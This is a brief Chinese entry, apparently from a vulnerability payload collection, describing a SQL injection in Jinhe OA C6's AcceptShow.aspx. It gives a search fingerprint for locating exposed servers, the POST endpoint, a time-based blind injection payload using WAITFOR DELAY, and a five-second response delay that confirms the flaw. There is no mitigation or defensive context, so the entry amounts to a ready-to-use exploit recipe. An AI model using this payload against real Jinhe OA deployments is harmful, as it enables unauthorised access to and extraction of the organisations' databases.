# 金和OAC6AcceptShow.aspx存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`body="JHSoft.Web.AddMenu"`
- **请求**：`POST /c6/Jhsoft.Web.accept/AcceptShow.aspx/ HTTP/1.1`

**Payload**
```
appid=1')WAITFOR/**/DELAY'0:0:5'--/Temp/&id=-1
```
- **响应特征**：200 响应时间>=5s